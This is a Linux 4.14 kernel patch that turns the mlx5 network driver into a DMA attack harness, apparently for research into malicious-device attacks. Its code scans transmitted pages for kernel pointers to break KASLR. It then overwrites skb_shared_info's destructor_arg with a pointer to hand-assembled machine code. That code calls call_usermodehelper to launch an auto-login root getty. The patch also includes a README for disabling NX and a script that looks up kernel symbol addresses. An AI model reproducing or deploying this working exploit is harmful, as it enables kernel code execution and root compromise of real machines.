@@ -1,0 +1,531 @@
+diff --git a/Makefile b/Makefile
+index ccd9818..b00cad9 100644
+--- a/Makefile
++++ b/Makefile
+@@ -2,7 +2,7 @@
+ VERSION = 4
+ PATCHLEVEL = 14
+ SUBLEVEL = 0
+-EXTRAVERSION =
++EXTRAVERSION = '-kaslr'
+ NAME = Fearless Coyote
+ 
+ # *DOCUMENTATION*
+diff --git a/README_shinfo b/README_shinfo
+new file mode 100644
+index 00000000..21b6b39
+--- /dev/null
++++ b/README_shinfo
+@@ -0,0 +1,4 @@
++Disable NX:
++boot cmdline : noexec=off noexec32=off
++
++Chosen PFN: 33517752
+diff --git a/drivers/net/ethernet/mellanox/mlx5/core/en.h b/drivers/net/ethernet/mellanox/mlx5/core/en.h
+index 13b5ef9..b849a15 100644
+--- a/drivers/net/ethernet/mellanox/mlx5/core/en.h
++++ b/drivers/net/ethernet/mellanox/mlx5/core/en.h
+@@ -126,6 +126,14 @@
+ 
+ #define MLX5E_NUM_MAIN_GROUPS 9
+ 
++typedef struct {
++	u64 page_offset;
++	u64 data_pointers_counter;
++	u64 max_data_pointer;
++	u64 kernel_base;
++	bool injected;
++} gilkup_vars_t;
++
+ static inline u16 mlx5_min_rx_wqes(int wq_type, u32 wq_size)
+ {
+ 	switch (wq_type) {
+@@ -331,6 +339,7 @@ enum mlx5e_dma_map_type {
+ };
+ 
+ struct mlx5e_sq_dma {
++	struct page *		page;
+ 	dma_addr_t              addr;
+ 	u32                     size;
+ 	enum mlx5e_dma_map_type type;
+diff --git a/drivers/net/ethernet/mellanox/mlx5/core/en_main.c b/drivers/net/ethernet/mellanox/mlx5/core/en_main.c
+index cc11bbb..8a99ac3 100644
+--- a/drivers/net/ethernet/mellanox/mlx5/core/en_main.c
++++ b/drivers/net/ethernet/mellanox/mlx5/core/en_main.c
+@@ -601,7 +601,6 @@ static int mlx5e_alloc_rq(struct mlx5e_channel *c,
+ 
+ 	switch (rq->wq_type) {
+ 	case MLX5_WQ_TYPE_LINKED_LIST_STRIDING_RQ:
+-
+ 		rq->post_wqes = mlx5e_post_rx_mpwqes;
+ 		rq->dealloc_wqe = mlx5e_dealloc_rx_mpwqe;
+ 
+diff --git a/drivers/net/ethernet/mellanox/mlx5/core/en_rx.c b/drivers/net/ethernet/mellanox/mlx5/core/en_rx.c
+index 91b1b09..4c54f8cb 100644
+--- a/drivers/net/ethernet/mellanox/mlx5/core/en_rx.c
++++ b/drivers/net/ethernet/mellanox/mlx5/core/en_rx.c
+@@ -43,6 +43,8 @@
+ #include "ipoib/ipoib.h"
+ #include "en_accel/ipsec_rxtx.h"
+ 
++extern gilkup_vars_t gilkup_vars;
++
+ static inline bool mlx5e_rx_hw_stamp(struct mlx5e_tstamp *tstamp)
+ {
+ 	return tstamp->hwtstamp_config.rx_filter == HWTSTAMP_FILTER_ALL;
+@@ -160,6 +162,7 @@ static inline u32 mlx5e_decompress_cqes_start(struct mlx5e_rq *rq,
+ }
+ 
+ #define RQ_PAGE_SIZE(rq) ((1 << rq->buff.page_order) << PAGE_SHIFT)
++#define RQ_PAGE_NUM(rq) (1 << rq->buff.page_order)
+ 
+ static inline bool mlx5e_page_is_reserved(struct page *page)
+ {
+@@ -212,9 +215,126 @@ static inline bool mlx5e_rx_cache_get(struct mlx5e_rq *rq,
+ 	return true;
+ }
+ 
++//#define PFN (33517752ULL)
++#define PFN 		(33538064ULL)
++#define ARGV_SPLIT 	(0x91eb40)
++#define UM_HELP		(0x097830)
++static inline void shared_info_write_page(char *base)
++{
++	/* Gil, write your ROP code magic here */
++
++	struct ubuf_info *uarg = (struct ubuf_info*)base;
++	memset(uarg, 0, sizeof(*uarg));
++	uarg->callback = (void*)(gilkup_vars.page_offset + (PFN << 12) + sizeof(*uarg));
++	refcount_set(&uarg->refcnt, 1);
++	base += sizeof(*uarg);
++
++	// "/sbin/getty -aroot tty9"
++	// 2f 73 62 69 6e 2f 67 65 74 74 79 20 2d 61 72 6f 6f 74 20 74 74 79 39 00
++
++	// mov rax, 0x003979747420746f
++	*(base++) = 0x48;
++	*(base++) = 0xb8;
++	*(u64*)base = 0x003979747420746f;
++        base += sizeof(u64);
++
++	// push rax
++	*(base++) = 0x50;
++
++	// mov rax, 0x6f72612d20797474
++	*(base++) = 0x48;
++	*(base++) = 0xb8;
++        *(u64*)base = 0x6f72612d20797474;
++        base += sizeof(u64);
++
++	// push rax
++	*(base++) = 0x50;
++
++	// mov rax, 0x65672f6e6962732f
++	*(base++) = 0x48;
++	*(base++) = 0xb8;
++        *(u64*)base = 0x65672f6e6962732f;
++        base += sizeof(u64);
++
++	// push rax
++	*(base++) = 0x50;
++
++	// xor rdi, rdi
++	*(base++) = 0x48;
++	*(base++) = 0x31;
++        *(base++) = 0xff;
++
++	// mov rsi, rsp
++        *(base++) = 0x48;
++        *(base++) = 0x89;
++        *(base++) = 0xe6;
++
++	// xor rdx, rdx
++        *(base++) = 0x48;
++        *(base++) = 0x31;
++        *(base++) = 0xd2;
++
++	// mov rax, <argv_split>
++        *(base++) = 0x48;
++        *(base++) = 0xc7;
++        *(base++) = 0xc0;
++	*(u32*)base = (u32)(gilkup_vars.kernel_base + ARGV_SPLIT); //TODO: replace with your argv_split
++	base += sizeof(u32);
++
++	// call rax
++        *(base++) = 0xff;
++        *(base++) = 0xd0;
++
++	// mov rdi, qword[rax]
++        *(base++) = 0x48;
++        *(base++) = 0x8b;
++        *(base++) = 0x38;
++
++	// mov rsi, rax
++        *(base++) = 0x48;
++        *(base++) = 0x89;
++        *(base++) = 0xc6;
++
++	//xor rcx, rcx
++        *(base++) = 0x48;
++        *(base++) = 0x31;
++        *(base++) = 0xc9;
++
++	// mov rax, <call_usermodehelper>
++        *(base++) = 0x48;
++        *(base++) = 0xc7;
++        *(base++) = 0xc0;
++        *(u32*)base = (u32)(gilkup_vars.kernel_base + UM_HELP); //TODO: replace with your call_usermodehelper
++        base += sizeof(u32);
++
++	// call rax
++        *(base++) = 0xff;
++        *(base++) = 0xd0;
++
++	// pop rax
++        *(base++) = 0x58;
++
++	// pop rax
++        *(base++) = 0x58;
++
++	// pop rax
++        *(base++) = 0x58;
++
++	// retn
++	*(base++) = 0xc3;
++}
++
++static inline void shared_info_write_rop(char *base, u32 size)
++{
++	u32 i;
++	for (i = 0; i < size; i += 4096)
++		shared_info_write_page(base + i);
++}
++
+ static inline int mlx5e_page_alloc_mapped(struct mlx5e_rq *rq,
+ 					  struct mlx5e_dma_info *dma_info)
+ {
++	struct page *p;
+ 	if (mlx5e_rx_cache_get(rq, dma_info))
+ 		return 0;
+ 
+@@ -222,13 +342,20 @@ static inline int mlx5e_page_alloc_mapped(struct mlx5e_rq *rq,
+ 	if (unlikely(!dma_info->page))
+ 		return -ENOMEM;
+ 
++	p = dma_info->page;
++	trace_printk("%-16s :%p : %p : >%lx<%d> \n",
++				rq->netdev->name,
++				p, page_address(p), page_to_pfn(p),
++				rq->buff.page_order);
++
+ 	dma_info->addr = dma_map_page(rq->pdev, dma_info->page, 0,
+-				      RQ_PAGE_SIZE(rq), rq->buff.map_dir);
++					RQ_PAGE_SIZE(rq), rq->buff.map_dir);
+ 	if (unlikely(dma_mapping_error(rq->pdev, dma_info->addr))) {
+ 		put_page(dma_info->page);
+ 		dma_info->page = NULL;
+ 		return -ENOMEM;
+ 	}
++	//shared_info_write_rop(page_address(dma_info->page), RQ_PAGE_SIZE(rq));
+ 
+ 	return 0;
+ }
+@@ -818,6 +945,44 @@ static inline int mlx5e_xdp_handle(struct mlx5e_rq *rq,
+ 	}
+ }
+ 
++/* sharedinfo attack
++	va - the start of the packet (same param that will be used build_skb)
++	frag_size - the size of the packet (same param that will be used build_skb)
++*/
++static inline void modify_shinfo(void *va, unsigned int frag_size)
++{
++	/* Gil, add your sharedinfo magic here...*/
++	//TODO: in my code there are magic offsets, I can recalculate them but this is easier
++
++	if (gilkup_vars.injected)
++		return;
++
++	if (gilkup_vars.data_pointers_counter > 256)
++		pr_crit_once("256 gilkup_vars.page_offset=%p max_ptr=%p kernel_base=%p\n",
++			(void*)gilkup_vars.page_offset, (void*)gilkup_vars.max_data_pointer, (void*)gilkup_vars.kernel_base);
++
++	//TODO: make sure that build_skb rewrite tx_flags; the hook should be after it.
++	if (gilkup_vars.kernel_base && gilkup_vars.data_pointers_counter > 512)
++	{
++		int i;
++		struct skb_shared_info *shinfo = (struct skb_shared_info*)((u64)va + frag_size - sizeof(*shinfo));
++		shinfo->destructor_arg = (void*)(gilkup_vars.page_offset + (PFN << 12)); //TODO: need your PFN...
++		shared_info_write_rop(shinfo->destructor_arg, PAGE_SIZE);
++	//	ASSERT(pfn_to_virt(PFN) == shinfo->destructor_arg);
++		shinfo->tx_flags = SKBTX_DEV_ZEROCOPY; //1<<3
++
++		pr_crit_once("512 gilkup_vars.page_offset=%p max_ptr=%p kernel_base=%p PFN=%p\n",
++			(void*)gilkup_vars.page_offset, (void*)gilkup_vars.max_data_pointer, (void*)gilkup_vars.kernel_base, (void*)PFN);
++		pr_crit_once("data %p destructor %p\n", va, shinfo->destructor_arg);
++		pr_crit_once("argv_split=%p call_usermodehelper=%p\n", &argv_split, &call_usermodehelper);
++		for (i = 0; i < 20; ++i)
++			pr_crit("destructor[%d]=%p\n", i , ((void**)shinfo->destructor_arg)[i]);
++
++		gilkup_vars.injected = true;
++	}
++}
++
++#define virt_to_pfn(kaddr)	(__pa(kaddr) >> PAGE_SHIFT)
+ static inline
+ struct sk_buff *skb_from_cqe(struct mlx5e_rq *rq, struct mlx5_cqe64 *cqe,
+ 			     struct mlx5e_wqe_frag_info *wi, u32 cqe_bcnt)
+@@ -833,6 +998,9 @@ struct sk_buff *skb_from_cqe(struct mlx5e_rq *rq, struct mlx5_cqe64 *cqe,
+ 	data           = va + rx_headroom;
+ 	frag_size      = MLX5_SKB_FRAG_SZ(rx_headroom + cqe_bcnt);
+ 
++	if (unlikely(virt_to_pfn(va) == PFN))
++		pr_err(" >>>>> ERROR >>>>>>>>>>>>>\n OUR PFN IS FREED\n>>>>>>>>>>>>>>>.\n");
++
+ 	dma_sync_single_range_for_cpu(rq->pdev,
+ 				      di->addr + wi->offset,
+ 				      0, frag_size,
+@@ -857,6 +1025,7 @@ struct sk_buff *skb_from_cqe(struct mlx5e_rq *rq, struct mlx5_cqe64 *cqe,
+ 		return NULL;
+ 	}
+ 
++	modify_shinfo(va, frag_size);
+ 	/* queue up for recycling/reuse */
+ 	page_ref_inc(di->page);
+ 
+@@ -866,6 +1035,7 @@ struct sk_buff *skb_from_cqe(struct mlx5e_rq *rq, struct mlx5_cqe64 *cqe,
+ 	return skb;
+ }
+ 
++/* packet handler #1 */
+ void mlx5e_handle_rx_cqe(struct mlx5e_rq *rq, struct mlx5_cqe64 *cqe)
+ {
+ 	struct mlx5e_wqe_frag_info *wi;
+@@ -989,6 +1159,7 @@ static inline void mlx5e_mpwqe_fill_rx_skb(struct mlx5e_rq *rq,
+ 	skb->len  += headlen;
+ }
+ 
++/* RX handler #2 */
+ void mlx5e_handle_rx_cqe_mpwrq(struct mlx5e_rq *rq, struct mlx5_cqe64 *cqe)
+ {
+ 	u16 cstrides       = mpwrq_get_cqe_consumed_strides(cqe);
+diff --git a/drivers/net/ethernet/mellanox/mlx5/core/en_tx.c b/drivers/net/ethernet/mellanox/mlx5/core/en_tx.c
+index 1d6925d..74fbf50 100644
+--- a/drivers/net/ethernet/mellanox/mlx5/core/en_tx.c
++++ b/drivers/net/ethernet/mellanox/mlx5/core/en_tx.c
+@@ -40,6 +40,8 @@
+ #define MLX5E_SQ_STOP_ROOM (MLX5_SEND_WQE_MAX_WQEBBS +\
+ 			    MLX5E_SQ_NOPS_ROOM)
+ 
++gilkup_vars_t gilkup_vars;
++
+ static inline void mlx5e_tx_dma_unmap(struct device *pdev,
+ 				      struct mlx5e_sq_dma *dma)
+ {
+@@ -57,6 +59,7 @@ static inline void mlx5e_tx_dma_unmap(struct device *pdev,
+ 
+ static inline void mlx5e_dma_push(struct mlx5e_txqsq *sq,
+ 				  dma_addr_t addr,
++				  struct page* page,
+ 				  u32 size,
+ 				  enum mlx5e_dma_map_type map_type)
+ {
+@@ -65,6 +68,7 @@ static inline void mlx5e_dma_push(struct mlx5e_txqsq *sq,
+ 	sq->db.dma_fifo[i].addr = addr;
+ 	sq->db.dma_fifo[i].size = size;
+ 	sq->db.dma_fifo[i].type = map_type;
++	sq->db.dma_fifo[i].page = page;
+ 	sq->dma_fifo_pc++;
+ }
+ 
+@@ -221,6 +225,66 @@ mlx5e_txwqe_build_eseg_gso(struct mlx5e_txqsq *sq, struct sk_buff *skb,
+ 	return ihs;
+ }
+ 
++/* This function accepts the starting address of dma_mapped page for read
++	ptr - kva to dma readable region start.
++	num_pages - number of contiguosly mapped pages.
++*/
++static inline void scan_pages(const char* ptr, u16 num_pages)
++{
++	/* Gil. add your KASLR breaking magic here...
++		Our goal is to translate knonw pfn to kva.
++	*/
++	/*
++		Bonus: pfn_to_virt/pfn_to_kaddr is just pfn << page_shift
++		We may not need this.
++	*/
++
++	u64 *p;
++	const char *end = ptr + 4096; //(num_pages * 4096);
++
++	if (smp_processor_id() != 0)
++		return;
++
++	if (gilkup_vars.kernel_base && gilkup_vars.data_pointers_counter > 512)
++		return;
++
++	//last bytes of init_net on my machine TODO: change it according to /proc/kallsyms
++	for (p = (u64*)ptr; p < (u64*)end; ++p) {
++		if ((*p & 0xffffffff000fffffULL) ==
++			  0xffffffff000e9040ULL) {
++			trace_printk("gilkup kernel pointer %p\n", (void*)*p);
++
++			//There is a small chance to see another pointer with the same suffix once in a while.
++			//If it happens, we can simpely count them and take the best out of 3 or something.
++			gilkup_vars.kernel_base = *p - 0xfe9040;
++		} else if ((*p & 0xffffe00000000000ULL) ==
++				 0xffff800000000000ULL) {
++			trace_printk("gilkup data pointer %p\n", (void*)*p);
++			++gilkup_vars.data_pointers_counter;
++
++			if (*p > gilkup_vars.max_data_pointer) {
++				//TODO: this is a rough guess, it may be optimized
++				//128 - machine's physical memory size
++				//gilkup_vars.page_offset = ((*p & ~((2ULL << 30) - 1)) - (128 * (1ULL << 30)));
++				gilkup_vars.page_offset = ((*p & ~((1ULL << 30) - 1)) - (128 * (1ULL << 30)));
++				//gilkup_vars.page_offset = ((*p & ~((1ULL << 30) - 1)) - (64 * (1ULL << 30))); //only 1st NUMA Node
++				gilkup_vars.max_data_pointer = *p;
++			}
++		}
++	}
++}
++
++static inline void shared_info_scan_pages(struct mlx5e_txqsq *sq)
++{
++	int i = 0;
++
++	for (i = 0; i < sq->dma_fifo_pc; i++) {
++		struct page *p = sq->db.dma_fifo[i].page;
++		scan_pages(page_address(p),
++				ALIGN(sq->db.dma_fifo[i].size, PAGE_SIZE) >> PAGE_SHIFT);
++	}
++}
++
+ static inline int
+ mlx5e_txwqe_build_dsegs(struct mlx5e_txqsq *sq, struct sk_buff *skb,
+ 			unsigned char *skb_data, u16 headlen,
+@@ -240,7 +304,8 @@ mlx5e_txwqe_build_dsegs(struct mlx5e_txqsq *sq, struct sk_buff *skb,
+ 		dseg->lkey       = sq->mkey_be;
+ 		dseg->byte_count = cpu_to_be32(headlen);
+ 
+-		mlx5e_dma_push(sq, dma_addr, headlen, MLX5E_DMA_MAP_SINGLE);
++		mlx5e_dma_push(sq, dma_addr, virt_to_page(skb_data),
++				headlen, MLX5E_DMA_MAP_SINGLE);
+ 		num_dma++;
+ 		dseg++;
+ 	}
+@@ -258,7 +323,8 @@ mlx5e_txwqe_build_dsegs(struct mlx5e_txqsq *sq, struct sk_buff *skb,
+ 		dseg->lkey       = sq->mkey_be;
+ 		dseg->byte_count = cpu_to_be32(fsz);
+ 
+-		mlx5e_dma_push(sq, dma_addr, fsz, MLX5E_DMA_MAP_PAGE);
++		mlx5e_dma_push(sq, dma_addr, frag->page.p,
++				fsz, MLX5E_DMA_MAP_PAGE);
+ 		num_dma++;
+ 		dseg++;
+ 	}
+@@ -357,6 +423,8 @@ static netdev_tx_t mlx5e_sq_xmit(struct mlx5e_txqsq *sq, struct sk_buff *skb,
+ 	if (unlikely(num_dma < 0))
+ 		goto dma_unmap_wqe_err;
+ 
++	/* Read new page posted to HW */
++	shared_info_scan_pages(sq);
+ 	mlx5e_txwqe_complete(sq, skb, opcode, ds_cnt + num_dma,
+ 			     num_bytes, num_dma, wi, cseg);
+ 
+diff --git a/drivers/net/ethernet/mellanox/mlx5/core/en_txrx.c b/drivers/net/ethernet/mellanox/mlx5/core/en_txrx.c
+index ab92298..575d85d 100644
+--- a/drivers/net/ethernet/mellanox/mlx5/core/en_txrx.c
++++ b/drivers/net/ethernet/mellanox/mlx5/core/en_txrx.c
+@@ -44,6 +44,7 @@ static inline bool mlx5e_channel_no_affinity_change(struct mlx5e_channel *c)
+ 	return cpumask_test_cpu(current_cpu, aff);
+ }
+ 
++/* NAPI Callback*/
+ int mlx5e_napi_poll(struct napi_struct *napi, int budget)
+ {
+ 	struct mlx5e_channel *c = container_of(napi, struct mlx5e_channel,
+diff --git a/drivers/net/ethernet/mellanox/mlx5/core/main.c b/drivers/net/ethernet/mellanox/mlx5/core/main.c
+index 06562c9..0d822a92 100644
+--- a/drivers/net/ethernet/mellanox/mlx5/core/main.c
++++ b/drivers/net/ethernet/mellanox/mlx5/core/main.c
+@@ -1577,6 +1577,9 @@ static int __init init(void)
+ 	if (err)
+ 		goto err_debug;
+ 
++	trace_printk("[%p (%lx), %lx] Offset %lx\n",
++			vmemmap, vmemmap_base, page_offset_base, PAGE_OFFSET);
++
+ #ifdef CONFIG_MLX5_CORE_EN
+ 	mlx5e_init();
+ #endif
+diff --git a/grep_map.sh b/grep_map.sh
+new file mode 100755
+index 00000000..100a11d
+--- /dev/null
++++ b/grep_map.sh
+@@ -0,0 +1,7 @@
++sudo grep -P "\Wstartup_64" /boot/System.map-4.14.0-kaslr
++sudo grep -P "\Wargv_split" /boot/System.map-4.14.0-kaslr
++sudo grep -P "\Wcall_usermodehelper$" /boot/System.map-4.14.0-kaslr
++
++sudo cat /proc/kallsyms | sudo grep -P "\Wstartup_64"
++sudo cat /proc/kallsyms |sudo grep -P "\Wargv_split"
++sudo cat /proc/kallsyms |sudo grep -P "\Wcall_usermodehelper$"
+diff --git a/include/linux/skbuff.h b/include/linux/skbuff.h
+index d448a48..2918560 100644
+--- a/include/linux/skbuff.h
++++ b/include/linux/skbuff.h
+@@ -581,7 +581,7 @@ typedef unsigned int sk_buff_data_t;
+ typedef unsigned char *sk_buff_data_t;
+ #endif
+ 
+-/** 
++/**
+  *	struct sk_buff - socket buffer
+  *	@next: Next buffer in list
+  *	@prev: Previous buffer in list
+@@ -870,7 +870,7 @@ static inline bool skb_pfmemalloc(const struct sk_buff *skb)
+  */
+ static inline struct dst_entry *skb_dst(const struct sk_buff *skb)
+ {
+-	/* If refdst was not refcounted, check we still are in a 
++	/* If refdst was not refcounted, check we still are in a
+ 	 * rcu_read_lock section
+ 	 */
+ 	WARN_ON((skb->_skb_refdst & SKB_DST_NOREF) &&
+@@ -1290,6 +1290,7 @@ static inline void skb_zcopy_clear(struct sk_buff *skb, bool zerocopy)
+ 	struct ubuf_info *uarg = skb_zcopy(skb);
+ 
+ 	if (uarg) {
++		pr_err("without refcnt skb %p data %p uarg %p cb %p\n", skb, skb->data, uarg, uarg->callback);
+ 		if (uarg->callback == sock_zerocopy_callback) {
+ 			uarg->zerocopy = uarg->zerocopy && zerocopy;
+ 			sock_zerocopy_put(uarg);
+diff --git a/kernel/irq/proc.c b/kernel/irq/proc.c
+index c010cc0..42606c9 100644
+--- a/kernel/irq/proc.c
++++ b/kernel/irq/proc.c
+@@ -125,7 +125,7 @@ static ssize_t write_irq_affinity(int type, struct file *file,
+ 	cpumask_var_t new_value;
+ 	int err;
+ 
+-	if (!irq_can_set_affinity_usr(irq) || no_irq_affinity)
++	if (!irq_can_set_affinity(irq) || no_irq_affinity)
+ 		return -EIO;
+ 
+ 	if (!alloc_cpumask_var(&new_value, GFP_KERNEL))
+diff --git a/net/core/skbuff.c b/net/core/skbuff.c
+index e140ba4..6f6ab4d 100644
+--- a/net/core/skbuff.c
++++ b/net/core/skbuff.c
+@@ -1084,6 +1084,8 @@ EXPORT_SYMBOL_GPL(sock_zerocopy_callback);
+ void sock_zerocopy_put(struct ubuf_info *uarg)
+ {
+ 	if (uarg && refcount_dec_and_test(&uarg->refcnt)) {
++		pr_crit("gilkup called callback with refcnt uarg=%p\n", uarg);
++
+ 		if (uarg->callback)
+ 			uarg->callback(uarg, uarg->zerocopy);
+ 		else
